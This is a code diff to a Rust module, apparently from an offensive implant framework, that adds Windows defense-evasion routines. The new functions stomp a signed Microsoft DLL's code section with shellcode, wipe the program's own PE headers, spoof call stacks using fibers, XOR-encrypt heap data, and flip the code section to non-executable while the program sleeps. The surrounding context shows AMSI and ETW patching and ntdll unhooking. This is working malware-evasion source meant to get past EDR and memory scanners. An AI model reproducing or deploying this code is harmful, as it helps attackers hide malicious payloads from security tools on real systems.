@@ -629,6 +629,253 @@ mod win {
         let _ = patch_etw();
         // 3. Unhook ntdll last (removes EDR hooks, gives us clean syscall stubs)
         let _ = unhook_ntdll();
+        // 4. Wipe PE headers (memory scanners can't identify our image)
+        let _ = wipe_pe_headers();
+    }
+
+    // ========================================================================
+    // F. Module Stomping
+    // ========================================================================
+
+    /// Load a benign, rarely-used DLL and overwrite its .text section with
+    /// our shellcode. Memory scanners see code living inside a signed
+    /// Microsoft module's memory space.
+    pub unsafe fn module_stomp(shellcode: &[u8]) -> bool {
+        let api = match resolve_api() {
+            Some(a) => a,
+            None => return false,
+        };
+
+        // Load wldp.dll — a rarely-used but signed Microsoft DLL
+        let dll_name = d_cstr(strings::S_WLDP_DLL);
+        let module = (api.load_library_a)(dll_name.as_ptr());
+        if module == 0 {
+            return false;
+        }
+
+        // Find .text section of the loaded DLL
+        let text_info = match find_text_section(module as *const u8) {
+            Some(t) => t,
+            None => return false,
+        };
+
+        if shellcode.len() > text_info.size {
+            return false; // shellcode too large for the .text section
+        }
+
+        let text_ptr = (module as *mut u8).add(text_info.rva);
+
+        // Make .text writable
+        let mut old_protect: u32 = 0;
+        if (api.virtual_protect)(text_ptr, text_info.size, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
+            return false;
+        }
+
+        // Zero the section first, then copy shellcode
+        ptr::write_bytes(text_ptr, 0, text_info.size);
+        ptr::copy_nonoverlapping(shellcode.as_ptr(), text_ptr, shellcode.len());
+
+        // Restore to RX — code now lives in signed module memory
+        let mut tmp: u32 = 0;
+        (api.virtual_protect)(text_ptr, text_info.size, PAGE_EXECUTE_READ, &mut tmp);
+
+        true
+    }
+
+    // ========================================================================
+    // G. Heap Encryption
+    // ========================================================================
+
+    use std::sync::Mutex;
+
+    static HEAP_STORE: once_cell::sync::Lazy<Mutex<Vec<(Vec<u8>, u8)>>> =
+        once_cell::sync::Lazy::new(|| Mutex::new(Vec::new()));
+
+    /// Encrypt data and store it on the heap. Returns a handle (index).
+    /// Data never sits in plaintext on the heap.
+    pub fn heap_encrypt(data: &[u8]) -> usize {
+        use rand::Rng;
+        let key: u8 = rand::thread_rng().gen();
+        let encrypted: Vec<u8> = data.iter().map(|b| b ^ key).collect();
+        let mut store = HEAP_STORE.lock().unwrap();
+        let handle = store.len();
+        store.push((encrypted, key));
+        handle
+    }
+
+    /// Decrypt data from the heap store. Caller should use and drop immediately.
+    pub fn heap_decrypt(handle: usize) -> Vec<u8> {
+        let store = HEAP_STORE.lock().unwrap();
+        if handle >= store.len() {
+            return Vec::new();
+        }
+        let (encrypted, key) = &store[handle];
+        encrypted.iter().map(|b| b ^ key).collect()
+    }
+
+    /// Securely clear data from the heap store (overwrite with zeros, then remove).
+    pub fn heap_clear(handle: usize) {
+        let mut store = HEAP_STORE.lock().unwrap();
+        if handle < store.len() {
+            let (ref mut data, ref mut key) = store[handle];
+            // Overwrite with zeros
+            for b in data.iter_mut() {
+                *b = 0;
+            }
+            *key = 0;
+            data.clear();
+        }
+    }
+
+    // ========================================================================
+    // H. PE Header Wipe
+    // ========================================================================
+
+    /// Wipe the PE headers of our own executable in memory.
+    /// Memory scanners can't identify our image as a PE anymore.
+    /// Call after all DLLs are loaded (init phase).
+    pub unsafe fn wipe_pe_headers() -> bool {
+        let api = match resolve_api() {
+            Some(a) => a,
+            None => return false,
+        };
+
+        // GetModuleHandleA(NULL) returns our own base address
+        let base = (api.get_module_handle_a)(ptr::null());
+        if base == 0 {
+            return false;
+        }
+
+        let base_ptr = base as *mut u8;
+        let header_size: usize = 4096; // DOS header + PE header + section table
+
+        // Make PE headers writable
+        let mut old_protect: u32 = 0;
+        if (api.virtual_protect)(base_ptr, header_size, PAGE_READWRITE, &mut old_protect) == 0 {
+            return false;
+        }
+
+        // Zero out the entire PE header region
+        ptr::write_bytes(base_ptr, 0, header_size);
+
+        // Restore original protection
+        let mut tmp: u32 = 0;
+        (api.virtual_protect)(base_ptr, header_size, old_protect, &mut tmp);
+
+        true
+    }
+
+    // ========================================================================
+    // I. Stack Spoofing via Fibers
+    // ========================================================================
+
+    type FnConvertThreadToFiber = unsafe extern "system" fn(*const ()) -> *mut ();
+    type FnCreateFiber = unsafe extern "system" fn(usize, unsafe extern "system" fn(*mut ()), *mut ()) -> *mut ();
+    type FnSwitchToFiber = unsafe extern "system" fn(*mut ());
+    type FnDeleteFiber = unsafe extern "system" fn(*mut ());
+
+    /// Trampoline for fiber execution. The fiber parameter points to a boxed closure.
+    unsafe extern "system" fn fiber_trampoline(param: *mut ()) {
+        let closure: Box<Box<dyn FnOnce()>> = Box::from_raw(param as *mut Box<dyn FnOnce()>);
+        closure();
+    }
+
+    /// Execute a closure inside a fiber. The call stack appears clean because
+    /// fiber stacks are separate from the main thread stack.
+    pub unsafe fn execute_in_fiber<F: FnOnce() + 'static>(func: F) -> bool {
+        let api = match resolve_api() {
+            Some(a) => a,
+            None => { func(); return false; },
+        };
+
+        let kernel32_name = d_cstr(strings::S_KERNEL32_DLL);
+        let kernel32 = (api.get_module_handle_a)(kernel32_name.as_ptr());
+        if kernel32 == 0 { func(); return false; }
+
+        let convert_fn: FnConvertThreadToFiber = {
+            let name = d_cstr(strings::S_CONVERT_THREAD_TO_FIBER);
+            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
+            if ptr.is_null() { func(); return false; }
+            std::mem::transmute(ptr)
+        };
+        let create_fn: FnCreateFiber = {
+            let name = d_cstr(strings::S_CREATE_FIBER);
+            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
+            if ptr.is_null() { func(); return false; }
+            std::mem::transmute(ptr)
+        };
+        let switch_fn: FnSwitchToFiber = {
+            let name = d_cstr(strings::S_SWITCH_TO_FIBER);
+            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
+            if ptr.is_null() { func(); return false; }
+            std::mem::transmute(ptr)
+        };
+        let delete_fn: FnDeleteFiber = {
+            let name = d_cstr(strings::S_DELETE_FIBER);
+            let ptr = (api.get_proc_address)(kernel32, name.as_ptr());
+            if ptr.is_null() { func(); return false; }
+            std::mem::transmute(ptr)
+        };
+
+        // Convert current thread to a fiber (if not already)
+        let main_fiber = convert_fn(ptr::null());
+        if main_fiber.is_null() {
+            func();
+            return false;
+        }
+
+        // Box the closure and pass as fiber parameter
+        let boxed: Box<Box<dyn FnOnce()>> = Box::new(Box::new(func));
+        let param = Box::into_raw(boxed) as *mut ();
+
+        // Create worker fiber
+        let worker_fiber = create_fn(0, fiber_trampoline, param);
+        if worker_fiber.is_null() {
+            // Clean up the leaked box
+            let _ = Box::from_raw(param as *mut Box<dyn FnOnce()>);
+            return false;
+        }
+
+        // Switch to worker fiber (executes the closure)
+        switch_fn(worker_fiber);
+
+        // We return here after the worker fiber completes
+        // (worker calls SwitchToFiber back to main implicitly when it returns)
+        delete_fn(worker_fiber);
+
+        true
+    }
+
+    // ========================================================================
+    // J. RX Flip (Code Section Protection Toggle)
+    // ========================================================================
+
+    /// Toggle code section between executable (RX) and data (RW).
+    /// During sleep: flip to RW so code section looks like data, not code.
+    /// During execution: flip to RX (executable again).
+    pub unsafe fn protect_code_section(executable: bool) -> bool {
+        let api = match resolve_api() {
+            Some(a) => a,
+            None => return false,
+        };
+
+        // Get our own module base
+        let base = (api.get_module_handle_a)(ptr::null());
+        if base == 0 {
+            return false;
+        }
+
+        // Find .text section
+        let text_info = match find_text_section(base as *const u8) {
+            Some(t) => t,
+            None => return false,
+        };
+
+        let text_ptr = (base as *mut u8).add(text_info.rva);
+        let new_protect = if executable { PAGE_EXECUTE_READ } else { PAGE_READWRITE };
+
+        let mut old_protect: u32 = 0;
+        (api.virtual_protect)(text_ptr, text_info.size, new_protect, &mut old_protect) != 0
     }
 }
 
@@ -672,6 +919,48 @@ pub fn syscall_table() -> Option<win::SyscallTable> {
     unsafe { win::SyscallTable::resolve() }
 }
 
+/// Stomp a benign DLL's .text section with shellcode (module stomping).
+#[cfg(all(target_os = "windows", feature = "evasion"))]
+pub fn module_stomp(shellcode: &[u8]) -> bool {
+    unsafe { win::module_stomp(shellcode) }
+}
+
+/// Encrypt data and store on heap. Returns handle.
+#[cfg(all(target_os = "windows", feature = "evasion"))]
+pub fn heap_encrypt(data: &[u8]) -> usize {
+    win::heap_encrypt(data)
+}
+
+/// Decrypt data from heap store by handle.
+#[cfg(all(target_os = "windows", feature = "evasion"))]
+pub fn heap_decrypt(handle: usize) -> Vec<u8> {
+    win::heap_decrypt(handle)
+}
+
+/// Clear encrypted data from heap store.
+#[cfg(all(target_os = "windows", feature = "evasion"))]
+pub fn heap_clear(handle: usize) {
+    win::heap_clear(handle)
+}
+
+/// Wipe PE headers of our own executable in memory.
+#[cfg(all(target_os = "windows", feature = "evasion"))]
+pub fn wipe_pe_headers() -> bool {
+    unsafe { win::wipe_pe_headers() }
+}
+
+/// Execute a closure inside a fiber for stack spoofing.
+#[cfg(all(target_os = "windows", feature = "evasion"))]
+pub fn execute_in_fiber<F: FnOnce() + 'static>(func: F) -> bool {
+    unsafe { win::execute_in_fiber(func) }
+}
+
+/// Toggle code section protection: true=RX (executable), false=RW (data).
+#[cfg(all(target_os = "windows", feature = "evasion"))]
+pub fn protect_code_section(executable: bool) -> bool {
+    unsafe { win::protect_code_section(executable) }
+}
+
 // No-op stubs for non-Windows or non-evasion builds
 #[cfg(not(all(target_os = "windows", feature = "evasion")))]
 pub fn patch_amsi() -> bool { false }
@@ -689,3 +978,24 @@ pub fn init() {}
 pub fn obfuscated_sleep(duration_ms: u64) {
     std::thread::sleep(std::time::Duration::from_millis(duration_ms));
 }
+
+#[cfg(not(all(target_os = "windows", feature = "evasion")))]
+pub fn module_stomp(_shellcode: &[u8]) -> bool { false }
+
+#[cfg(not(all(target_os = "windows", feature = "evasion")))]
+pub fn heap_encrypt(data: &[u8]) -> usize { let _ = data; 0 }
+
+#[cfg(not(all(target_os = "windows", feature = "evasion")))]
+pub fn heap_decrypt(_handle: usize) -> Vec<u8> { Vec::new() }
+
+#[cfg(not(all(target_os = "windows", feature = "evasion")))]
+pub fn heap_clear(_handle: usize) {}
+
+#[cfg(not(all(target_os = "windows", feature = "evasion")))]
+pub fn wipe_pe_headers() -> bool { false }
+
+#[cfg(not(all(target_os = "windows", feature = "evasion")))]
+pub fn execute_in_fiber<F: FnOnce() + 'static>(func: F) -> bool { func(); false }
+
+#[cfg(not(all(target_os = "windows", feature = "evasion")))]
+pub fn protect_code_section(_executable: bool) -> bool { false }
